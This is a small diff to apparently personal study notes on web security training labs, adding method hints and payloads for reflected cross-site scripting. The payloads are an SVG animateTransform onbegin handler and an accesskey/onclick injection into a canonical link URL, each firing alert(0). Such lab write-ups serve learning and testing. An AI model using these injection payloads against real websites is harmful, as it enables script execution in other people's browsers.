@@ -3,4 +3,12 @@
 
 
 -----> Lab: Reflected XSS with some SVG markup allowed
+	method: brute-force the tags to see all allowed tags.
+		You'll find that <svg> and <animateTransform> tags are allowed.
+		Learn how these two tags work together. 
 	payload: <svg><animateTransform onbegin=alert(0)>
+
+-----> Lab: Reflected XSS in canonical link tag
+	method: 
+		add ?'accesskey='x'onclick='alert(0) to the homepage URL
+		
